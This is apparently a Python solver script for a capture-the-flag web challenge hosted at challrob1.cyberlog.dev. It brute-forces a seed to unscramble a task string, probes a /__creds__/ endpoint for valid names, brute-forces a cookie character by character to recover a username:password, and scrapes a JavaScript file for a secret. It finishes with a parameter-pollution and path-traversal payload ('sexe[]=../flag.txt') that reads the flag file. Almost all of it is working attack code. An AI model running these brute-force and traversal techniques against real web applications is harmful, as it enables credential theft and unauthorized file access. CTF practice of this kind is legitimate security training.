import random
import requests
import re
import time


url = 'https://challrob1.cyberlog.dev'

print("\033[H\033[J")
print("Solver challenge 15/01")
print("\n")
print('=====================================')
print('Step 1 : Retrieve encrypted task')
print('=====================================')

output = "D:sc s _rsei e_s-dul is dm  sununT pTe-iisTrs/ODnsopdsdrip/e eosseprn_dem: rccO/mi-nrn dli_cslcsid c_ccsdssoOr  er sOTincps_dnds_ Our_  meO s/mVeo/es_ e orsissT_or cnodcdsclurddeDmV _irem:rmOcrrredoOs :Or_T_eVeVo  r_- Os-esmmr/sp_e_ eo/oDc:/r_ r"

print("Decrypting task...")
print("=> " + output[:200] + " [...]")

flag_len = len(output) // 5
for seed in range(1337):
    random.seed(seed)
    choices = random.choices(list(range(flag_len)), k=len(output))
    flag = [''] * len(output)
    for i, v in enumerate(choices):
        flag[v] = output[i]
    flag = ''.join(flag)
    if flag.startswith('TODO'):
        print("\033[92m + Decrypted task : " + flag + "\033[0m")
        break
print("\n")
print('=====================================')
print('Step 2 : Bruteforce bernard-marc cookie')
print('=====================================')

print("Retrieving all known names...")

dictionary_names = {
    "coutand-bastien": "Coutand Bastien",
    "chapron-lucas": "Chapron Lucas",
    "denoue-enzo": "Denoue Enzo",
    "bernard-marc": "Bernard Marc"
}

print(dictionary_names)
for name in dictionary_names:
    endpoint = '/__creds__/' + name
    r = requests.get(url + endpoint)
    if "ENSIBS" not in r.text:
        print("\033[92m + Valid name found : " + name + "\033[0m" + " => content : " + r.text)
        break
    else :
        print("\033[91m - Invalid name : " + name + "\033[0m" + " => lead to a redirection")


endpoint = '/__creds__/bernard-marc'
cookie = {"mycookie": "a"}
caracteres = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_{}'*-+"
r = requests.get(url + endpoint, cookies=cookie)

print('\n')
print('/...\ Bruteforcing cookie under > ' + url + endpoint)

start_time = time.time()

while True : 
     if "is incorrect" in r.text:
         for c in caracteres:
             cookie["mycookie"] = c
             r = requests.get(url + endpoint, cookies=cookie)
             if "is incorrect" not in r.text:
                 print("Found char: " + c)
                 break
         else:
             print("Char not found")
             break
     elif "Length of cookie do not match" in r.text:
         cookie["mycookie"] += caracteres[0]
         for c in caracteres:
             cookie["mycookie"] = cookie["mycookie"][:-1] + c
             r = requests.get(url + endpoint, cookies=cookie)
             if "is incorrect" not in r.text:
                 print("Found char: " + c)
                 break
     else:
        print("\033[92m + Cookie found : " + cookie["mycookie"] + "\033[0m")
        print("\033[92m + Retrieved username:password " + r.text + "\033[0m")
        break

end_time = time.time()
time_taken = end_time - start_time

print("=> Time taken to retrieve the flag: %.2f seconds" % time_taken)
     
print("\n")
print('=====================================')
print('Step 3 : Retrieve hidden endpoint')
print('=====================================')

response = requests.get('https://challrob1.cyberlog.dev/js/bernard_projects.js')
match = re.search(r'(?<=Secret ).*', response.text)

if match is not None:
    print('Testing endpoint : https://challrob1.cyberlog.dev/js/bernard_projects.js')
    print("\033[92m + Secret " + match.group() + "\033[0m")
else:
    print("No match found")

print("\n")
print('=====================================')
print('Step 4 : Exploit HTTP Polluting on /bernard_projects/monkeygen?sexe=X')
print('=====================================')

endpoint = '/bernard_projects/monkeygen?sexe'

print("Testing endpoint : " + url + endpoint + '=f ...')
response = requests.get(url + endpoint + '=f')
print(response.text)
print("Testing endpoint : " + url + endpoint + '=m ...')
response = requests.get(url + endpoint + '=m')
print(response.text)
print("\n")
print("\033[93m + Now performing HTTP Polluting on " + url + endpoint + '=m\033[0m ...')

response = requests.get(url + endpoint + '[]=../flag.txt')
print("Exploit => " + url + endpoint + '[]=../flag.txt')
if response.status_code == 200:
    print("\033[92m + Exploit successfull \033[0m")
    matchflag = re.search(r'CLOG{.*}', response.text)
    if matchflag is not None:
        print("\033[92m + Flag found : " + matchflag.group().replace('"}', '') + "\033[0m")
    else:
        print("Flag not found")
else:
    print("Exploit failed")

print("\n")